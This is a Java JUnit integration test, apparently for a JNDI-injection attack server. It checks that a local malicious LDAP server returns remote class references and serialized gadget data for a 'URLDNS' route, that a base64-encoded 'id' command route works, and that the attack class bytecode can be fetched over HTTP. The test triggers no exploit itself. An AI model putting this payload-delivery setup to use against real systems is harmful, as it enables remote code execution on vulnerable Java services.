package com.bloom.server;

import com.bloom.util.config;
import com.unboundid.ldap.sdk.LDAPConnection;
import com.unboundid.ldap.sdk.SearchResultEntry;
import com.unboundid.ldap.sdk.SearchScope;
import org.junit.Assert;
import org.junit.BeforeClass;
import org.junit.Test;

import java.net.HttpURLConnection;
import java.net.ServerSocket;
import java.net.URL;

/**
 * LDAP/HTTP 投递链路集成测试：只读 LDAP 返回属性与 HTTP 状态，不触发客户端 JNDI 解析。
 */
public class LdapServerIntegrationTest {

    private static int ldapPort;
    private static int httpPort;

    @BeforeClass
    public static void startServers() throws Exception {
        ldapPort = freePort();
        httpPort = freePort();
        config.ip = "127.0.0.1";
        config.ldapPort = ldapPort;
        config.httpPort = httpPort;
        HttpServerStart.start();
        LdapServer.lanuchLDAPServer();
        Thread.sleep(300);
    }

    @Test
    public void basicRouteReturnsRemoteReference() throws Exception {
        try (LDAPConnection conn = new LDAPConnection("127.0.0.1", ldapPort)) {
            SearchResultEntry entry = conn.searchForEntry("basic/base64/aWQ=", SearchScope.BASE, "(objectClass=*)");
            Assert.assertNotNull(entry);
            Assert.assertEquals("foo", entry.getAttributeValue("javaClassName"));
            String factory = entry.getAttributeValue("javaFactory");
            Assert.assertNotNull("basic 路由应返回 javaFactory", factory);
            Assert.assertNotNull(entry.getAttributeValue("javaCodeBase"));
            Assert.assertNull("basic 路由不应携带序列化数据", entry.getAttributeValue("javaSerializedData"));

            URL url = new URL("http://127.0.0.1:" + httpPort + "/" + factory.replace('.', '/') + ".class");
            HttpURLConnection http = (HttpURLConnection) url.openConnection();
            Assert.assertEquals("HTTP 侧应能取到工厂类字节码", 200, http.getResponseCode());
            Assert.assertTrue(http.getContentLength() > 0);
            http.disconnect();
        }
    }

    @Test
    public void gadgetRouteReturnsSerializedData() throws Exception {
        try (LDAPConnection conn = new LDAPConnection("127.0.0.1", ldapPort)) {
            SearchResultEntry entry = conn.searchForEntry("URLDNS/test.example.com", SearchScope.BASE, "(objectClass=*)");
            Assert.assertNotNull(entry);
            Assert.assertNotNull("gadget 路由应返回 javaSerializedData", entry.getAttributeValue("javaSerializedData"));
            Assert.assertNull(entry.getAttributeValue("javaFactory"));
        }
    }

    private static int freePort() throws Exception {
        try (ServerSocket socket = new ServerSocket(0)) {
            return socket.getLocalPort();
        }
    }
}
